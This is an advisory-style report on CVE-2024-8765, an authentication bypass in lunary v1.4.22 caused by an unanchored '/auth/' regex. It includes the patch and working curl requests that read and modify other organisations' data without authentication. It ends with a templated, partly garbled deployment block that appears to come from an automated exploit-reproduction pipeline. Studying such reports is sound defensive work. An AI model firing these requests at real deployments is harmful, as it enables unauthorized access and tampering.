"# CVE-2024-8765 Detailed Report\n\n## Summary\nCVE-2024-8765 is a high-severity vulnerability identified in the `lunary-ai/lunary` software, specifically affecting version v1.4.22. The vulnerability is classified under CWE-41, which pertains to improper resolution of path equivalence. The flaw lies in the privilege check mechanism of the application, which incorrectly identifies certain endpoints as public if the path contains '/auth/' anywhere within it. This oversight allows unauthenticated attackers to access sensitive endpoints, leading to potential data exposure and unauthorized modifications.\n\n## Root Cause of the Vulnerability\nThe root cause of the vulnerability is found in the way the application checks for public routes. The relevant code snippet from the advisory is as follows:\n\n```javascript\nconst isPublicRoute = publicRoutes.some((route) =>\n    typeof route === \"string\" ? route === ctx.path : route.test(ctx.path),\n);\n```\n\nThe `publicRoutes` array includes a regular expression that checks for the presence of '/auth/' in the path:\n\n```javascript\nconst publicRoutes = [\n  new RegExp(`/auth/.+`),\n  ...\n];\n```\n\nThis regex allows any path containing '/auth/' to be treated as a public route, regardless of the actual endpoint being accessed. As a result, sensitive endpoints can be accessed without proper authentication if the attacker includes '/auth/' in the request path. The patch addresses this issue by changing the regex to ensure that '/auth/' must be at the start of the path:\n\n```javascript\nconst publicRoutes = [\n  new RegExp(`^/auth/.+`),\n  ...\n];\n```\n\nThis change ensures that only paths starting with '/auth/' are considered public, thus preventing unauthorized access to sensitive endpoints.\n\n## Exploitation Details\nTo exploit this vulnerability, an attacker can craft requests to sensitive endpoints by including '/auth/' in the path. The security advisory provides the following proof-of-concept (PoC) examples:\n\n1. Accessing a private endpoint without authentication:\n   ```bash\n   curl -X GET \"http://localhost:3333/v1/orgs/auth/usage?projectId=96b5f97b-daee-4dba-bc8c-4e4423c84710\" \\\n        -H \"Authorization: Bearer 96b5f97b-daee-4dba-bc8c-4e4423c84710\"\n   ```\n\n2. Modifying data on another organization's playground:\n   ```bash\n   curl -X POST \"http://localhost:3333/v1/orgs/auth/playground\" \\\n        -H \"Authorization: Bearer 96b5f97b-daee-4dba-bc8c-4e4423c84710\" \\\n        -H \"Content-Type: application/json\" \\\n        -d '{\"content\":[\"\"],\"extra\":\"\",\"variables\":{}}'\n   ```\n\nIn both cases, the attacker can bypass authentication checks by manipulating the request path.\n\n## Environment Setup Requirements\nTo reproduce the vulnerability, the following environment setup is required:\n\n```\n## Environment Setup Requirements\n- Port: 3333\n- Target Endpoint: /v1/orgs/auth/usage\n- Explicit Configuration: None specified\n```\n\n## Complete PoC Code\nThe following proof-of-concept code is provided in the advisory:\n\n```bash\ncurl -X GET \"http://localhost:3333/v1/orgs/auth/usage?projectId=96b5f97b-daee-4dba-bc8c-4e4423c84710\" \\\n     -H \"Authorization: Bearer 96b5f97b-daee-4dba-bc8c-4e4423c84710\"\n\ncurl -X POST \"http://localhost:3333/v1/orgs/auth/playground\" \\\n     -H \"Authorization: Bearer 96b5f97b-daee-4dba-bc8c-4e4423c84710\" \\\n     -H \"Content-Type: application/json\" \\\n     -d '{\"content\":[\"\"],\"extra\":\"\",\"variables\":{}}'\n```\n\nThis code demonstrates how an attacker can exploit the vulnerability to access sensitive data and modify resources without proper authentication.\n\n## üöÄ DEPLOYMENT STRATEGY (USE THIS - DO NOT GUESS!)\n\n**Repository URL**: https://github.com/lunary-ai/lunary\n**Platform**: N/A\n**Language**: None\n**Build Tool**: None\n\n### Build Commands:\n```bash\n\n```\n\n### Start Commands:\n```bash\n\n```\n\n### Deployment Notes:\n‰ªé GitHub Ê∫êÁ†ÅÈÉ®ÁΩ≤„ÄÇËØ≠Ë®Ä: Êú™Áü•, ÊûÑÂª∫Â∑•ÂÖ∑: Êú™Áü•\n\n‚ö†Ô∏è **CRITICAL INSTRUCTIONS**:\n1. DO NOT try to find Docker images or guess repository URLs\n2. USE THE REPOSITORY URL PROVIDED ABOVE\n3. Clone from the specified repository and follow build/start commands\n4. If build commands fail, analyze error and adapt (but keep using the same repo)\n"